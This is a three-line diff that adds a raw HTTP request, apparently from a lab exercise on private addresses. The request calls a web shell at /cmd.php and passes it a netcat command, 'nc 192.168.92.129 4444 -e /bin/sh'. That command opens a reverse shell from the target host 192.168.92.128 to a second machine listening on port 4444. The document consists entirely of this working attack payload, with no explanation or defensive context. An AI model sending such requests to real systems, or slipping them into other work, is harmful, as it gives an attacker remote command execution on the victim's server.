@@ -1,0 +1,3 @@
+GET /cmd.php?cmd=nc%20192.168.92.129%204444%20-e%20/bin/sh HTTP/1.1
+Host: 192.168.92.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
